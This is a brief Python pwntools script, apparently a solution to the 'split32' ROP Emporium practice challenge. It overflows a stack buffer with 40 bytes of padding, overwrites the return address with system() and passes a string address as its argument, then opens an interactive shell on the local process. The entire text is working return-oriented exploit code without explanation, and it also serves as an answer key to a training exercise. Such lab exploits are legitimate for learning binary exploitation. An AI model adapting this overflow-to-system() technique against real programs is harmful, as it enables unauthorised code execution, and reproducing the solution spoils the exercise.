from pwn import *

split32 = process('split32')
split32.recv()

payload = b"A" * 40         # input
payload += b"EBP4"          # ebp
payload += p32(0x08048430)  # pwnme eip -> system
payload += b"EIP4"          # system eip
payload += p32(0x0804a030)  # system arg1

split32.sendline(payload)
split32.interactive()
